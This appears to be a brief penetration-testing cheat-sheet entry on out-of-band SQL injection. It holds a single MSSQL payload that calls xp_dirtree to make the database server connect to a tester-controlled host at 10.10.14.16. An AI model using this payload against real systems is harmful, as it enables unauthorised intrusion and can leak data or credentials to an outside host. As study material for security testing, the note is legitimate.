# Out-of-Band (OAST) SQLi
( Vulnerability that consists of triggering an out-of-band network connection to a system that you control.)
 
 Beispiel-Payload
 ```sql
 '; exec master..xp_dirtree '//10.10.14.16/f' --
 ```
 
 